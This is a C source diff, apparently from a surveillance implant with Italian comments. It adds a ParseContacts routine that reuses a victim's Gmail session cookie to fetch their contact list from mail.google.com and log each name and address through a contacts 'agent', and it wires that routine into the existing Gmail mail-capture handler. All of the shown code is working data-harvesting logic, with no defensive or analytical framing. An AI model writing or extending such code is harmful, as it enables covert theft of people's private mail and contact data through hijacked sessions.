@@ -10,6 +10,7 @@
 #define GM_MAIL_IDENTIFIER ",[\"^all\",\""
 #define GM_INBOX_IDENTIFIER "inbox"
 #define GM_OUTBOX_IDENTIFIER "sent"
+#define GM_CONTACT_IDENTIFIER "[\"ct\",\""
 
 #define FREE_INNER_PARSING(x) if (!x) { SAFE_FREE(r_buffer_inner); break; }
 #define FREE_PARSING(x) if (!x) { SAFE_FREE(r_buffer); return SOCIAL_REQUEST_BAD_COOKIE; }
@@ -22,6 +23,63 @@ extern BOOL DumpContact(HANDLE hfile, DWORD program, WCHAR *name, WCHAR *email, 
 extern BOOL bPM_MailCapStarted; // variabili per vedere se gli agenti interessati sono attivi
 extern BOOL bPM_ContactsStarted; 
 extern DWORD max_social_mail_len;
+
+DWORD ParseContacts(char *cookie, char *ik_val, WCHAR *user_name)
+{
+	HANDLE hfile;
+	WCHAR mail_request[256];
+	BYTE *r_buffer = NULL;
+	DWORD ret_val;
+	DWORD response_len = 0;
+	char *parser1, *parser2;
+	WCHAR screen_name[256];
+	WCHAR mail_account[256];
+	DWORD flags;
+
+	CheckProcessStatus();
+	// Prende la lista dei messaggi per la mail box selezionata
+	_snwprintf_s(mail_request, sizeof(mail_request)/sizeof(WCHAR), L"/mail/?ui=2&ik=%S&view=au&rt=j", ik_val);
+	ret_val = HttpSocialRequest(L"mail.google.com", L"GET", mail_request, 443, NULL, 0, &r_buffer, &response_len, cookie);
+	if (ret_val != SOCIAL_REQUEST_SUCCESS)
+		return ret_val;
+	parser1 = (char *)r_buffer;
+
+	CheckProcessStatus();
+	hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
+	LOOP {
+		flags = 0;
+		parser1 = strstr(parser1, GM_CONTACT_IDENTIFIER);
+		if (!parser1)
+			break;
+		parser1 += strlen(GM_CONTACT_IDENTIFIER);
+		parser2 = strchr(parser1, '\"');
+		if (!parser2)
+			break;
+		*parser2 = NULL;
+		_snwprintf_s(screen_name, sizeof(screen_name)/sizeof(WCHAR), _TRUNCATE, L"%S", parser1);
+		parser1 = parser2 + 1;
+
+		parser1 = strstr(parser1, ",\"");
+		if (!parser1)
+			break;
+		parser1 += strlen(",\"");
+		parser2 = strchr(parser1, '\"');
+		if (!parser2)
+			break;
+		*parser2 = NULL;
+		_snwprintf_s(mail_account, sizeof(mail_account)/sizeof(WCHAR), _TRUNCATE, L"%S", parser1);
+		parser1 = parser2 + 1;
+
+		if (!wcscmp(mail_account, user_name))
+			flags |= CONTACTS_MYACCOUNT;
+
+		DumpContact(hfile, CONTACT_SRC_GMAIL, mail_account, NULL, NULL, NULL, NULL, NULL, NULL, NULL, screen_name, NULL, flags);
+	}
+	Log_CloseFile(hfile);
+
+	SAFE_FREE(r_buffer);
+	return SOCIAL_REQUEST_SUCCESS;
+}
 
 DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi, DWORD last_tstamp_lo, BOOL is_incoming)
 {
@@ -169,7 +227,6 @@ DWORD ParseMailBox(char *mbox, char *cookie, char *ik_val, DWORD last_tstamp_hi,
 DWORD HandleGMail(char *cookie)
 {
 	DWORD ret_val;
-	HANDLE hfile;
 	BYTE *r_buffer = NULL;
 	DWORD response_len;
 	WCHAR mail_request[256];
@@ -206,7 +263,8 @@ DWORD HandleGMail(char *cookie)
 	*ptr2 = 0;
 	_snprintf_s(ik_val, sizeof(ik_val), _TRUNCATE, "%s", ptr);	
 
-	// Cattura il proprio account
+	// Cattura i contatti
+	ret_val = SOCIAL_REQUEST_SUCCESS;
 	if (bPM_ContactsStarted) {
 		ptr = ptr2 + 1;
 		ptr = strchr(ptr, '\"');
@@ -220,15 +278,13 @@ DWORD HandleGMail(char *cookie)
 		// Se e' diverso dall'ultimo username allora lo logga...
 		if (wcscmp(mail_request, last_user_name)) {
 			_snwprintf_s(last_user_name, sizeof(last_user_name)/sizeof(WCHAR), _TRUNCATE, L"%s", mail_request);		
-			hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
-			DumpContact(hfile, CONTACT_SRC_GMAIL, mail_request, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CONTACTS_MYACCOUNT);
-			Log_CloseFile(hfile);
+			ret_val = ParseContacts(cookie, ik_val, last_user_name);
 		}
 	}
 
 	SAFE_FREE(r_buffer);
 	if (!bPM_MailCapStarted)
-		return SOCIAL_REQUEST_SUCCESS;
+		return ret_val;
 
 	last_tstamp_lo = GetLastFBTstamp(ik_val, &last_tstamp_hi);
 	ParseMailBox(GM_OUTBOX_IDENTIFIER, cookie, ik_val, last_tstamp_hi, last_tstamp_lo, FALSE);
